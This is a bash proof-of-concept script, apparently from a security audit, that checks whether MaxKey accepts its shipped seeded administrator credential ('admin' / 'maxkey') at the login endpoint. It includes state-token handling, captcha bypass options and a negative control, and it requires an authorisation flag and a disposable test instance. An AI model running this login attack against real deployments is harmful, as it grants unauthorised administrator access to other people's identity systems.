#!/usr/bin/env bash
# =============================================================================
#  repro-default-admin.sh
#
#  ###########################################################################
#  #  NOT EXECUTED BY THE AUDIT.                                          #
#  #  This script was WRITTEN but NEVER RUN. The audit environment had no #
#  #  MaxKey instance, no network access and no database. Every           #
#  #  "EXPECTED IF VULNERABLE" / "EXPECTED IF FIXED" statement below is a #
#  #  PREDICTION derived from reading the source, NOT an observation.     #
#  ###########################################################################
#
#  FINDING
#    maxkey-20261002-seeded-admin-default-credential
#
#  SOURCE BASIS (all verified by reading the repo at commit
#                 3e5662b1a91291c0d85de826544119c86e77d8e6)
#    1. The shipped init SQL seeds the administrator with a literal password:
#         deployment/docker/docker-mysql/docker-entrypoint-initdb.d/latest/maxkey.sql:1665
#          INSERT INTO `mxk_userinfo` VALUES ('1','admin','{plain}maxkey','',0,...)
#    2. The PasswordEncoder bean is a DelegatingPasswordEncoder that maps the id
#       "plain" to a NoOp encoder:
#         maxkey-starter/maxkey-starter-web/.../autoconfigure/ApplicationAutoConfiguration.java
#           encoders.put("plain", NoOpPasswordEncoder.getInstance());
#           new DelegatingPasswordEncoder(idForEncode, encoders);   // idForEncode = bcrypt
#    3. DelegatingPasswordEncoder selects the validating encoder from the {id}
#       PREFIX OF THE STORED VALUE, so "{plain}maxkey" is validated as plaintext.
#       This link is RUNTIME-PROVEN by poc/harness-a (see harness-results/).
#    4. The seeded row is active: STATUS=1, ISLOCKED=1, and the user is in
#       ROLE_ADMINISTRATORS.
#
#  WHAT THIS SCRIPT ADDS BEYOND THE HARNESS
#    The harness proves the encoder semantics in isolation. This script proves
#    the END-TO-END consequence against a real running instance: that the seeded
#    value is actually accepted as a login credential by the running product.
#
#  WHAT IT CANNOT PROVE
#    It cannot distinguish "the shipped default was never changed" from "the
#    shipped default is still accepted after an operator changed it". If it
#    fails, that may simply mean this instance is already remediated.
#
#  PREREQUISITES
#    * A DISPOSABLE MaxKey instance you own and are authorised to test.
#    * The instance must still carry the SHIPPED seed row. Verify first with:
#        SELECT ID, USERNAME, PASSWORD, STATUS, ISLOCKED, INSTID
#          FROM mxk_userinfo WHERE ID = '1';
#      If PASSWORD is not '{plain}maxkey', this instance is already remediated
#      and the script will report FIXED for that reason alone.
#    * curl.
#    * Captcha must be enabled or the script will need CAPTCHA_BYPASS.
#      See "CAPTCHA" below.
#
#  CAPTCHA NOTE
#    The login handler is POST /login/signin and the captcha is validated from
#    the credential body. If your instance has captcha enabled you must supply a
#    solved captcha, which requires solving an image. To keep this script
#    runnable, set the institution's captcha to NONE for the duration of the
#    test, OR set CAPTCHA_BYPASS=1 and pass POC_CAPTCHA_VALUE with a value your
#    instance accepts. A refused login because of a wrong captcha is an
#    INCONCLUSIVE result, not evidence of a fix.
#
#  USAGE
#    POC_I_HAVE_AUTHORIZATION=1 \
#    POC_TARGET_HOST=http://127.0.0.1:8080 \
#    ./repro-default-admin.sh
#
#  Environment:
#    POC_TARGET_HOST      (required) base URL of the disposable instance
#    POC_I_HAVE_AUTHORIZATION=1  (required) acknowledgement of authorisation
#    POC_USERNAME         (optional, default: admin)      <- the shipped default
#    POC_PASSWORD         (optional, default: maxkey)     <- the shipped default
#    CAPTCHA_BYPASS       (optional) set to 1 if captcha is disabled
#    POC_CAPTCHA_VALUE    (optional) captcha answer when captcha is enabled
# =============================================================================

set -uo pipefail
cd "$(dirname "$0")"
# shellcheck source=_lib.sh
. ./_lib.sh

SCRIPT_NAME="repro-default-admin.sh"
poc_guard "$SCRIPT_NAME"

HOST="${POC_TARGET_HOST%/}"
USERNAME="${POC_USERNAME:-admin}"
PASSWORD="${POC_PASSWORD:-maxkey}"

trap poc_cleanup EXIT

echo
echo "=============================================================================="
echo " Finding 1: seeded administrator default credential"
echo " Target user: '$USERNAME'  (default credential from the shipped init SQL)"
echo "=============================================================================="
echo

# -----------------------------------------------------------------------------
# STEP 1 — obtain a login state token. POST /login/signin rejects a credential
# whose `state` does not validate (LoginEntryPoint.java:225).
# -----------------------------------------------------------------------------
echo "[STEP 1] GET /login/get  -> obtain a state token"
LOGIN_GET_CODE=$(poc_curl GET "$HOST/login/get")
poc_info "GET /login/get returned HTTP $LOGIN_GET_CODE"
poc_require_reachable "$HOST/login/get" "$SCRIPT_NAME"
GET_BODY=$(poc_body)

# Pull the state token out of the JSON. Kept deliberately dependency-free.
STATE=$(printf '%s' "$GET_BODY" \
  | sed -n 's/.*"state"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
if [ -n "$STATE" ]; then
  poc_info "obtained a state token (${#STATE} chars)"
else
  poc_info "no state token found in the response; the instance may not require one"
  poc_info "response was: $(printf '%s' "$GET_BODY" | head -c 300)"
  STATE=""
fi

# -----------------------------------------------------------------------------
# STEP 2 — fetch a captcha, if the instance demands one.
# -----------------------------------------------------------------------------
CAPTCHA=""
if [ "${CAPTCHA_BYPASS:-}" = "1" ]; then
  poc_info "CAPTCHA_BYPASS=1, not requesting a captcha"
else
  echo
  echo "[STEP 2] GET /captcha -> request a captcha"
  CAP_CODE=$(poc_curl GET "$HOST/captcha?captcha=text")
  poc_info "GET /captcha returned HTTP $CAP_CODE"
  CAP_BODY=$(poc_body)
  echo "         $CAP_BODY"
  CAPTCHA="${POC_CAPTCHA_VALUE:-}"
  if [ -z "$CAPTCHA" ]; then
    poc_warn "no captcha answer supplied."
    poc_warn "Set POC_CAPTCHA_VALUE to a solved value, or set CAPTCHA_BYPASS=1 if this"
    poc_warn "instance has captcha disabled. A captcha failure makes the result"
    poc_warn "INCONCLUSIVE rather than FIXED."
  fi
fi

# -----------------------------------------------------------------------------
# STEP 3 — submit the shipped default credential.
# -----------------------------------------------------------------------------
echo
echo "[STEP 3] POST /login/signin  username='$USERNAME'"
PAYLOAD=$(printf '{"username":"%s","password":"%s","captcha":"%s","state":"%s","authType":"0"}' \
  "$USERNAME" "$PASSWORD" "$CAPTCHA" "$STATE")

SIGNIN_CODE=$(poc_curl POST "$HOST/login/signin" \
  -H 'Content-Type: application/json' \
  -H 'Accept: application/json' \
  --data-raw "$PAYLOAD")
SIGNIN_BODY=$(poc_body)
poc_info "POST /login/signin returned HTTP $SIGNIN_CODE"
poc_require_reachable "$HOST/login/signin" "$SCRIPT_NAME"

echo
echo "----------------- RESPONSE BODY -----------------"
printf '%s\n' "$SIGNIN_BODY" | head -c 2000
echo
echo "-----------------------------------------------"
echo

# -----------------------------------------------------------------------------
# STEP 4 — verdict.
# -----------------------------------------------------------------------------
echo "[STEP 4] verdict"
echo
echo "  EXPECTED IF VULNERABLE"
echo "    * HTTP 200 with a JSON body containing a token / authToken field, and"
echo "      no error message: the shipped default credential was accepted."
echo "    * The account is the built-in administrator (ROLE_ADMINISTRATORS), so"
echo "      this is unauthenticated-to-administrator escalation."
echo
echo "  EXPECTED IF FIXED"
echo "    * A non-2xx status, or HTTP 200 carrying an explicit error message and"
echo "      NO token. Typically an 'invalid username or password' style message."
echo

IS_SUCCESS=0
case "$SIGNIN_CODE" in
  2*) IS_SUCCESS=1 ;;
esac

# A 200 that still carries an error message is NOT a success.
if [ "$IS_SUCCESS" = "1" ]; then
  if printf '%s' "$SIGNIN_BODY" | grep -qiE '"(authToken|token|accessToken|jwtToken)"[[:space:]]*:[[:space:]]*"[^"]+"'; then
    poc_vulnerable "HTTP $SIGNIN_CODE AND the response body contains an issued token:"
    printf '%s\n' "$SIGNIN_BODY" | head -c 400
    echo
    echo
    echo "    => the seeded administrator accepted the shipped default password."
  elif printf '%s' "$SIGNIN_BODY" | grep -qiE 'captcha'; then
    poc_inconclusive "the response mentions a captcha. The login was never actually"
    poc_inconclusive "evaluated, so this proves NOTHING. Supply POC_CAPTCHA_VALUE and"
    poc_inconclusive "re-run. Do NOT record this as a fixed result."
  elif printf '%s' "$SIGNIN_BODY" | grep -qiE '"(errorMessage|message|error)"[[:space:]]*:[[:space:]]*"[^"]+"' \
       && ! printf '%s' "$SIGNIN_BODY" | grep -qiE '"(authToken|token)"[[:space:]]*:[[:space:]]*"[^"]+"'; then
    poc_fixed "HTTP $SIGNIN_CODE but the body carries an error and no token."
  else
    poc_inconclusive "HTTP $SIGNIN_CODE with an ambiguous body. Read it above and decide manually."
  fi
else
  poc_fixed "HTTP $SIGNIN_CODE — the login was refused."
fi

# -----------------------------------------------------------------------------
# STEP 5 — a negative control. If the seeded password is accepted, a WRONG
# password must be refused by the same endpoint. If the instance accepts a wrong
# password too, the endpoint is not testing passwords at all and the result above
# means nothing.
# -----------------------------------------------------------------------------
echo
echo "[STEP 5] negative control — submit a deliberately wrong password"
BAD_PAYLOAD=$(printf '{"username":"%s","password":"DefinitelyNotTheSeededPw0rd!","captcha":"%s","state":"%s","authType":"0"}' \
  "$USERNAME" "$CAPTCHA" "$STATE")
BAD_CODE=$(poc_curl POST "$HOST/login/signin" \
  -H 'Content-Type: application/json' -H 'Accept: application/json' \
  --data-raw "$BAD_PAYLOAD")
BAD_BODY=$(poc_body)
poc_info "wrong password returned HTTP $BAD_CODE"

if printf '%s' "$BAD_BODY" | grep -qiE '"(authToken|accessToken|jwtToken)"[[:space:]]*:[[:space:]]*"[^"]+"'; then
  poc_inconclusive "a WRONG password was also accepted — this endpoint is not validating"
  poc_inconclusive "passwords, so neither result from STEP 3 is meaningful. Stop and investigate."
else
  poc_info "control OK: a wrong password is refused, so STEP 3 is meaningful."
fi

echo
echo "[NOTE] If captcha caused the refusal, this run is INCONCLUSIVE. Re-run with a"
echo "       solved POC_CAPTCHA_VALUE, or with captcha disabled on the institution."
echo "[NOTE] If you changed the admin password on this instance, the refusal is a"
echo "       configuration difference, not evidence that the finding is fixed."

poc_summary "$SCRIPT_NAME"
